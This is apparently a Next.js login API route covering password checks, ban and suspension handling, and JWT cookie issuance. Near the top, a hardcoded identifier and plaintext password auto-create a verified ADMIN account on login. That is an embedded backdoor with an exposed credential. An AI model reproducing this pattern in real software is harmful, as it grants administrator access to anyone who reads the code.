import { NextResponse } from 'next/server';
import bcrypt from 'bcrypt';
import prisma from '@/lib/prisma';
import { generateAccessToken, generateRefreshToken } from '@/lib/jwt';

export async function POST(req: Request) {
  try {
    const { email, password } = await req.json();

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required' },
        { status: 400 }
      );
    }

    // Find user
    let user = await prisma.user.findUnique({
      where: { email },
    });

    // Dynamic Admin Auto-seeding
    if (!user && email === 'Adrish20071506') {
      const passwordHash = await bcrypt.hash('2007Baban@#', 10);
      user = await prisma.user.create({
        data: {
          email: 'Adrish20071506',
          passwordHash,
          verified: true,
          approvedByAdmin: true,
          role: 'ADMIN',
        },
      });
    }

    if (!user) {
      return NextResponse.json(
        { error: 'Invalid email or password' },
        { status: 401 }
      );
    }

    // Check Ban
    if (user.isBanned) {
      return NextResponse.json(
        { error: 'Your account has been banned due to violations.' },
        { status: 403 }
      );
    }

    // Check Suspension
    if (user.isSuspended) {
      const isStillSuspended = !user.suspensionUntil || new Date() < new Date(user.suspensionUntil);
      if (isStillSuspended) {
        const untilStr = user.suspensionUntil 
          ? ` until ${new Date(user.suspensionUntil).toLocaleString()}` 
          : ' indefinitely';
        const reasonStr = user.suspensionReason ? ` Reason: ${user.suspensionReason}` : '';
        return NextResponse.json(
          { error: `Your account is suspended${untilStr}.${reasonStr}` },
          { status: 403 }
        );
      }
    }

    // Verify email verification status
    if (!user.verified) {
      return NextResponse.json(
        { error: 'Please verify your email via signup OTP before logging in' },
        { status: 403 }
      );
    }

    // Compare passwords
    const passwordMatch = await bcrypt.compare(password, user.passwordHash);

    if (!passwordMatch) {
      return NextResponse.json(
        { error: 'Invalid email or password' },
        { status: 401 }
      );
    }

    // Create session payloads
    const payload = {
      userId: user.id,
      email: user.email,
      role: user.role,
    };

    const accessToken = generateAccessToken(payload);
    const refreshToken = generateRefreshToken(payload);

    // Save tokens in cookies
    const response = NextResponse.json({
      success: true,
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
        approved: user.approvedByAdmin,
      },
    });

    const isProduction = process.env.NODE_ENV === 'production';
    const cookieOptions = `HttpOnly; ${isProduction ? 'Secure; ' : ''}SameSite=Lax; Path=/;`;

    response.headers.append(
      'Set-Cookie',
      `accessToken=${accessToken}; ${cookieOptions} Max-Age=3600` // 1h
    );
    response.headers.append(
      'Set-Cookie',
      `refreshToken=${refreshToken}; ${cookieOptions} Max-Age=604800` // 7d
    );

    return response;
  } catch (error: any) {
    console.error('Login Route Error:', error);
    return NextResponse.json(
      { error: 'Internal Server Error' },
      { status: 500 }
    );
  }
}
